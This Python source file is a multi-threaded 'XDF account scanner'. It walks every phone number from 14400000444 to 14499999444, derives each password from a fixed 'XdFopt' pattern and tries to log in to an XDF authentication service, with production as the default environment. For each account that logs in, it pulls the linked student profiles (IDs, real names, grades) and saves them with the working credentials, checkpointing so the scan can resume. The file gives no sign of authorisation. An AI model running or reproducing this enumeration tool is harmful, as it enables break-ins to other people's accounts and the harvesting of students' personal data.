#!/usr/bin/env python3
"""
XDF 账号扫描器
遍历手机号 14400000444 ~ 14499999444，查找可用账号。

手机号格式: 144XXXXX444
密码格式:   XdFoptXXXXX  (XXXXX 为手机号中间5位数字)

用法:
    xdfvafinder --start 0 --end 99 --env test            # 测试小范围（安装后）
    python -m xdfvafinder.scanner --start 0 --end 99     # 免安装（项目根目录执行）
    xdfvafinder --resume                                 # 从断点恢复
"""

import argparse
import logging
import signal
import sys
import threading
import time
from collections import deque
from collections.abc import Sequence
from concurrent.futures import FIRST_COMPLETED, Future, ThreadPoolExecutor, wait
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from tqdm import tqdm

from xdflib import XDFAuthClient
from xdflib.models import LoginResult, StudentProfile

from .cache import CACHE_FILE, DEFAULT_TTL_DAYS, InvalidCache
from .checkpoint import ProgressTracker, ScanState, read_state, write_state
from .env import ENV_CHOICES, env_name, resolve_env
from .storage import ResultWriter

# ── 常量 ──────────────────────────────────────────────────────────
CHECKPOINT_FILE = "scan_progress.json"
OUTPUT_FILE = "valid_accounts.txt"
LOG_FILE = "scan.log"
CHECKPOINT_INTERVAL = 100  # 每连续扫描 100 个号码保存一次进度
MAX_DIGITS = 99999
MOBILE_TEMPLATE = "144{digits:05d}444"
PASSWORD_TEMPLATE = "XdFopt{digits:05d}"

# 单次登录尝试的错误类型
ERROR_STOPPED = "stopped"
ERROR_NETWORK = "network"
ERROR_TASK = "task_error"

logger = logging.getLogger("scanner")


# ── 日志配置 ──────────────────────────────────────────────────────
def setup_logging(verbose: bool = False, log_file: str | Path = LOG_FILE) -> logging.Logger:
    """配置 ``scanner`` 日志：文件全量、控制台只显示警告以上。"""
    level = logging.DEBUG if verbose else logging.INFO
    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

    file_handler = logging.FileHandler(log_file, encoding="utf-8")
    file_handler.setLevel(level)
    file_handler.setFormatter(fmt)

    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.DEBUG if verbose else logging.WARNING)
    console_handler.setFormatter(fmt)

    scanner_logger = logging.getLogger("scanner")
    # 先关闭旧 handler，避免重复运行/测试时文件句柄泄漏
    for handler in scanner_logger.handlers:
        handler.close()
    scanner_logger.handlers.clear()
    scanner_logger.setLevel(level)
    scanner_logger.addHandler(file_handler)
    scanner_logger.addHandler(console_handler)
    return scanner_logger


# ── 单次登录结果 ──────────────────────────────────────────────────
@dataclass
class LoginOutcome:
    """一次登录尝试的结果。"""

    digits: int
    mobile: str
    password: str
    success: bool
    u2_user_id: str = ""
    u2at: str = ""
    students: list[StudentProfile] = field(default_factory=list)
    error_code: str = ""
    error_msg: str = ""
    error_type: str | None = None


# ── 扫描器 ───────────────────────────────────────────────────────
class Scanner:
    """XDF 账号扫描器。"""

    def __init__(
        self,
        start: int = 0,
        end: int = MAX_DIGITS,
        threads: int = 3,
        delay: float = 0.5,
        env: str = "prod",
        output: str | Path = OUTPUT_FILE,
        resume: bool = False,
        checkpoint_file: str | Path = CHECKPOINT_FILE,
        incremental: bool = False,
        cache_file: str | Path = CACHE_FILE,
        cache_ttl_days: float = DEFAULT_TTL_DAYS,
    ) -> None:
        if not 0 <= start <= MAX_DIGITS:
            raise ValueError(f"start 必须在 0~{MAX_DIGITS} 之间: {start}")
        if not 0 <= end <= MAX_DIGITS:
            raise ValueError(f"end 必须在 0~{MAX_DIGITS} 之间: {end}")
        if start > end:
            raise ValueError(f"start ({start}) 不能大于 end ({end})")

        self.start = start
        self.end = end
        self.threads = max(1, threads)
        self.delay = max(0.0, delay)
        self.resume = resume
        self.env = resolve_env(env)
        self.output_file = Path(output)
        self.checkpoint_file = Path(checkpoint_file)

        # 增量扫描：跳过缓存里"上次确认不可用"的号码（同时更新缓存）
        self.incremental = incremental
        self.cache = InvalidCache(cache_file, ttl_days=cache_ttl_days) if incremental else None
        self.skipped_count = 0

        # 客户端（XDFAuthClient 无状态，可多线程共享）
        self.auth = XDFAuthClient(env=self.env)

        # 同时最多在途的任务数：限制内存占用，也让中断更及时
        self._window = max(self.threads * 4, 4)

        # 线程同步
        self._stats_lock = threading.Lock()
        self._rate_lock = threading.Lock()
        self._next_request_at = 0.0
        self.stop_event = threading.Event()

        # 统计
        self.valid_count = 0
        self.invalid_count = 0
        self.error_count = 0
        self.total_scanned = 0

        self._writer = ResultWriter(self.output_file)

    # ── 号码生成 ──────────────────────────────────────────────────
    @staticmethod
    def generate(digits: int) -> tuple[str, str]:
        """根据中间 5 位数字生成手机号和密码。"""
        return MOBILE_TEMPLATE.format(digits=digits), PASSWORD_TEMPLATE.format(digits=digits)

    # ── 速率控制 ──────────────────────────────────────────────────
    def rate_limit(self) -> None:
        """跨线程限制请求发起间隔，保证不小于 ``self.delay`` 秒。"""
        if self.delay <= 0:
            return
        with self._rate_lock:
            waiting = self._next_request_at - time.monotonic()
            if waiting > 0:
                time.sleep(waiting)
            self._next_request_at = time.monotonic() + self.delay

    # ── 登录尝试 ──────────────────────────────────────────────────
    def try_login(self, digits: int) -> LoginOutcome:
        """尝试单个账号登录；成功后附带该账号的学员列表。"""
        mobile, password = self.generate(digits)

        if self.stop_event.is_set():
            return LoginOutcome(
                digits=digits,
                mobile=mobile,
                password=password,
                success=False,
                error_type=ERROR_STOPPED,
            )

        self.rate_limit()

        try:
            result = self.auth.login(mobile, password)
        except Exception as exc:  # noqa: BLE001  (网络/解析异常统一按网络错误处理)
            logger.error("登录异常 digits=%05d: %s", digits, exc)
            return LoginOutcome(
                digits=digits,
                mobile=mobile,
                password=password,
                success=False,
                error_msg=str(exc),
                error_type=ERROR_NETWORK,
            )

        if not result.success:
            return LoginOutcome(
                digits=digits,
                mobile=mobile,
                password=password,
                success=False,
                error_code=result.error_code,
                error_msg=result.error_msg,
            )

        return LoginOutcome(
            digits=digits,
            mobile=mobile,
            password=password,
            success=True,
            u2_user_id=result.u2_user_id,
            u2at=result.u2at,
            students=self._fetch_students(digits, result),
        )

    def _fetch_students(self, digits: int, result: LoginResult) -> list[StudentProfile]:
        """获取学员列表；失败只记录警告，不影响"账号可登录"的判断。"""
        try:
            return self.auth.fetch_student_list(result.u2_user_id, result.u2at)
        except Exception as exc:  # noqa: BLE001
            logger.warning("获取学员列表失败 digits=%05d: %s", digits, exc)
            return []

    # ── 结果处理 ──────────────────────────────────────────────────
    def handle_result(self, outcome: LoginOutcome) -> None:
        """统计、写日志、并把有效账号写入结果文件。"""
        with self._stats_lock:
            self.total_scanned += 1

        if outcome.error_type == ERROR_STOPPED:
            return

        if outcome.success:
            with self._stats_lock:
                self.valid_count += 1
            student_strs = [
                f"{s.student_id}/{s.real_name}/{s.grade_name}" for s in outcome.students
            ]
            logger.info(
                "【有效】%s | %s | u2=%s | 学员=%s",
                outcome.mobile,
                outcome.password,
                outcome.u2_user_id,
                ", ".join(student_strs) if student_strs else "无",
            )
            self._writer.write_valid(
                outcome.mobile, outcome.password, outcome.u2_user_id, outcome.students
            )
            return

        if outcome.error_type == ERROR_NETWORK:
            with self._stats_lock:
                self.error_count += 1
            logger.warning(
                "【网络错误】%05d mobile=%s: %s", outcome.digits, outcome.mobile, outcome.error_msg
            )
            return

        with self._stats_lock:
            self.invalid_count += 1
        # 只有"接口正常返回、判定不可用"才写入缓存；task_error 等异常不算
        if self.cache is not None and outcome.error_type is None:
            self.cache.mark_invalid(outcome.digits)
        logger.debug(
            "【无效】%s code=%s msg=%s", outcome.mobile, outcome.error_code, outcome.error_msg
        )

    # ── 断点管理 ──────────────────────────────────────────────────
    def save_checkpoint(self, last_digits: int) -> None:
        """把当前进度（连续水位）写入断点文件。"""
        state = ScanState(
            last_digits=last_digits,
            end=self.end,
            env=env_name(self.env),
            valid_count=self.valid_count,
            total_scanned=self.total_scanned,
            updated_at=datetime.now().isoformat(),
        )
        write_state(self.checkpoint_file, state)

    def load_checkpoint(self) -> ScanState | None:
        """读取断点，并把统计计数接续到上次的值。"""
        state = read_state(self.checkpoint_file)
        if state is None:
            return None
        self.valid_count = state.valid_count
        self.total_scanned = state.total_scanned
        logger.info(
            "发现断点: last_digits=%s, 从 %s 继续（已扫描 %d，有效 %d）",
            state.last_digits,
            state.last_digits + 1,
            state.total_scanned,
            state.valid_count,
        )
        return state

    # ── 信号处理 ──────────────────────────────────────────────────
    def _setup_signal_handlers(self) -> None:
        """注册 Ctrl+C / SIGTERM 处理器，第一次中断只置停止标志。"""

        def handler(signum, frame):
            logger.warning("收到中断信号，正在优雅退出...")
            self.stop_event.set()

        try:
            signal.signal(signal.SIGINT, handler)
            signal.signal(signal.SIGTERM, handler)
        except (ValueError, OSError) as exc:  # 非主线程或平台不支持
            logger.debug("未能注册信号处理器: %s", exc)

    # ── 主循环 ────────────────────────────────────────────────────
    def run(self, *, install_signals: bool = True) -> bool:
        """执行扫描；返回是否被中断（中断时断点已保存到磁盘）。"""
        if install_signals:
            self._setup_signal_handlers()

        started_at = time.monotonic()

        if self.resume:
            state = self.load_checkpoint()
            if state is None:
                logger.warning("未找到可用断点，从头开始扫描")
            else:
                self.start = state.last_digits + 1
                if state.env and state.env != env_name(self.env):
                    logger.warning(
                        "断点记录的环境(%s)与当前(--env %s)不一致，仍从 %05d 继续",
                        state.env,
                        env_name(self.env),
                        self.start,
                    )

        if self.start > self.end:
            logger.warning("断点已覆盖到 %05d，没有需要扫描的号码", self.start - 1)
            return False

        # 增量扫描：用缓存过滤待扫描号码；被跳过的号码同样算"已处理"，
        # 这样断点水位能正常推进，--resume 不会倒回去重扫。
        queue: deque[int] = deque()
        skipped: list[int] = []
        if self.cache is None:
            queue.extend(range(self.start, self.end + 1))
        else:
            self.cache.load()
            for digits in range(self.start, self.end + 1):
                if self.cache.is_invalid(digits):
                    skipped.append(digits)
                else:
                    queue.append(digits)
            self.skipped_count = len(skipped)
            self._log_incremental()

        total = len(queue)
        logger.info(
            "开始扫描: range=%d-%d (%d 个号码), 待扫描=%d, threads=%d, delay=%.1fs, env=%s",
            self.start,
            self.end,
            self.end - self.start + 1,
            total,
            self.threads,
            self.delay,
            self.env.name,
        )

        tracker = ProgressTracker(self.start)
        for digits in skipped:
            tracker.mark(digits)
        last_saved = self.start - 1
        futures: dict[Future[LoginOutcome], int] = {}
        interrupted = False

        # resume 且结果文件已存在时续写，否则清空并写表头
        truncate = not self.resume or not self.output_file.exists()
        self._writer.open(start=self.start, end=self.end, truncate=truncate)

        try:
            with (
                # disable=None: 非 TTY（CI、管道、pytest）下自动隐藏进度条
                tqdm(total=total, desc="扫描进度", unit="个", ncols=100, disable=None) as pbar,
                ThreadPoolExecutor(max_workers=self.threads) as executor,
            ):
                self._fill(executor, queue, futures)

                while futures:
                    done, _ = wait(set(futures), return_when=FIRST_COMPLETED)
                    for future in done:
                        digits = futures.pop(future)
                        outcome = self._outcome_from_future(future, digits)
                        self.handle_result(outcome)
                        pbar.update(1)
                        pbar.set_postfix(
                            {
                                "有效": self.valid_count,
                                "无效": self.invalid_count,
                                "错误": self.error_count,
                            }
                        )
                        watermark = tracker.mark(digits)
                        if watermark is not None and watermark - last_saved >= CHECKPOINT_INTERVAL:
                            self.save_checkpoint(watermark)
                            last_saved = watermark

                    if self.stop_event.is_set():
                        interrupted = True
                        break

                    self._fill(executor, queue, futures)
        except KeyboardInterrupt:
            logger.warning("用户中断扫描")
            interrupted = True
            self.stop_event.set()
        finally:
            for future in futures:
                future.cancel()
            self._writer.close()
            watermark = tracker.last_contiguous
            if watermark is not None and watermark > last_saved:
                self.save_checkpoint(watermark)
                logger.info("进度已保存到 %s", self.checkpoint_file)
            if self.cache is not None:
                self.cache.prune()
                self.cache.save()
                logger.info(
                    "增量缓存已更新: %s（%d 条不可用）",
                    self.cache.path,
                    len(self.cache),
                )

        self._print_summary(interrupted=interrupted, elapsed=time.monotonic() - started_at)
        return interrupted

    def _log_incremental(self) -> None:
        """打印增量扫描的缓存命中情况。"""
        cache = self.cache
        if cache is None:
            return
        ttl = "永不过期" if cache.ttl_days is None else f"{cache.ttl_days:g} 天"
        if self.skipped_count:
            logger.info(
                "增量扫描: 跳过 %d 个上次确认不可用的号码，待扫描 %d 个（缓存 %d 条，TTL %s）",
                self.skipped_count,
                self.end - self.start + 1 - self.skipped_count,
                len(cache),
                ttl,
            )
        else:
            logger.info("增量扫描: 没有可跳过的号码（缓存 %d 条，TTL %s）", len(cache), ttl)

    def _fill(
        self,
        executor: ThreadPoolExecutor,
        queue: deque[int],
        futures: dict[Future[LoginOutcome], int],
    ) -> None:
        """把任务补满到窗口上限（保持内存在有界范围）。"""
        while queue and len(futures) < self._window and not self.stop_event.is_set():
            digits = queue.popleft()
            futures[executor.submit(self.try_login, digits)] = digits

    def _outcome_from_future(self, future: Future[LoginOutcome], digits: int) -> LoginOutcome:
        """取回任务结果；任务本身抛异常时记为 ``task_error``。"""
        try:
            return future.result()
        except Exception as exc:  # noqa: BLE001
            logger.error("任务异常 digits=%05d: %s", digits, exc)
            mobile, password = self.generate(digits)
            return LoginOutcome(
                digits=digits,
                mobile=mobile,
                password=password,
                success=False,
                error_msg=str(exc),
                error_type=ERROR_TASK,
            )

    def _print_summary(self, *, interrupted: bool, elapsed: float) -> None:
        """打印运行汇总。"""
        print("\n" + "=" * 60)
        print("扫描已中断！" if interrupted else "扫描完成！")
        print(f"  总扫描数: {self.total_scanned}")
        print(f"  有效账号: {self.valid_count}")
        print(f"  无效账号: {self.invalid_count}")
        print(f"  网络错误: {self.error_count}")
        if self.cache is not None:
            print(f"  跳过（上次不可用）: {self.skipped_count}")
            print(f"  增量缓存: {self.cache.path}（{len(self.cache)} 条）")
        print(f"  耗时:     {elapsed:.1f}s")
        print(f"  有效账号已保存到: {self.output_file}")
        if self.checkpoint_file.exists():
            print(f"  断点已保存到: {self.checkpoint_file}")
        print("=" * 60)


# ── 命令行入口 ────────────────────────────────────────────────────
def _digits_arg(value: str) -> int:
    """argparse 类型：0~99999 的整数。"""
    try:
        digits = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"必须是 0~{MAX_DIGITS} 的整数: {value!r}") from None
    if not 0 <= digits <= MAX_DIGITS:
        raise argparse.ArgumentTypeError(f"必须在 0~{MAX_DIGITS} 之间: {digits}")
    return digits


def _positive_int(value: str) -> int:
    """argparse 类型：>=1 的整数。"""
    try:
        number = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"必须是正整数: {value!r}") from None
    if number < 1:
        raise argparse.ArgumentTypeError(f"必须 >= 1: {number}")
    return number


def _non_negative_float(value: str) -> float:
    """argparse 类型：>=0 的浮点数。"""
    try:
        number = float(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"必须是数字: {value!r}") from None
    if number < 0:
        raise argparse.ArgumentTypeError(f"必须 >= 0: {number}")
    return number


def build_parser() -> argparse.ArgumentParser:
    """构造扫描器命令行解析器。"""
    parser = argparse.ArgumentParser(
        description="XDF 账号扫描器 — 遍历 14400000444 ~ 14499999444",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
    xdfvafinder --start 0 --end 99 --env test                # 测试小范围
    xdfvafinder --start 0 --end 99 --env test --verbose      # 详细日志
    xdfvafinder                                              # 全量扫描 (PROD)
    xdfvafinder --resume                                     # 从断点恢复
    xdfvafinder --threads 8 --delay 0.1                      # 8 线程, 快速模式
        """,
    )
    parser.add_argument("--start", type=_digits_arg, default=0, help="起始数字 0~99999 (默认: 0)")
    parser.add_argument(
        "--end", type=_digits_arg, default=MAX_DIGITS, help=f"结束数字 0~99999 (默认: {MAX_DIGITS})"
    )
    parser.add_argument("--threads", type=_positive_int, default=3, help="并发线程数 (默认: 3)")
    parser.add_argument(
        "--delay", type=_non_negative_float, default=0.5, help="请求间隔秒数 (默认: 0.5)"
    )
    parser.add_argument("--resume", action="store_true", help="从上次中断处恢复")
    parser.add_argument(
        "--env", choices=ENV_CHOICES, default="prod", help="环境选择 (默认: prod，测试请用 test)"
    )
    parser.add_argument("--output", default=OUTPUT_FILE, help=f"结果输出文件 (默认: {OUTPUT_FILE})")
    parser.add_argument(
        "--checkpoint",
        default=CHECKPOINT_FILE,
        help=f"断点文件 (默认: {CHECKPOINT_FILE})",
    )
    parser.add_argument("--log-file", default=LOG_FILE, help=f"日志文件 (默认: {LOG_FILE})")
    parser.add_argument(
        "--incremental",
        action="store_true",
        help="增量扫描：跳过缓存中上次确认不可用的号码，并更新缓存",
    )
    parser.add_argument("--cache", default=CACHE_FILE, help=f"增量缓存文件 (默认: {CACHE_FILE})")
    parser.add_argument(
        "--cache-ttl",
        type=_non_negative_float,
        default=DEFAULT_TTL_DAYS,
        help=f"缓存有效期（天），0 表示永不过期 (默认: {DEFAULT_TTL_DAYS:g})",
    )
    parser.add_argument("--verbose", "-v", action="store_true", help="输出详细日志到控制台")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    """命令行入口；返回进程退出码（0 正常，130 被中断）。"""
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.start > args.end:
        parser.error(f"--start ({args.start}) 不能大于 --end ({args.end})")

    setup_logging(verbose=args.verbose, log_file=args.log_file)
    scanner = Scanner(
        start=args.start,
        end=args.end,
        threads=args.threads,
        delay=args.delay,
        env=args.env,
        output=args.output,
        resume=args.resume,
        checkpoint_file=args.checkpoint,
        incremental=args.incremental,
        cache_file=args.cache,
        cache_ttl_days=args.cache_ttl,
    )
    return 130 if scanner.run() else 0


if __name__ == "__main__":
    sys.exit(main())
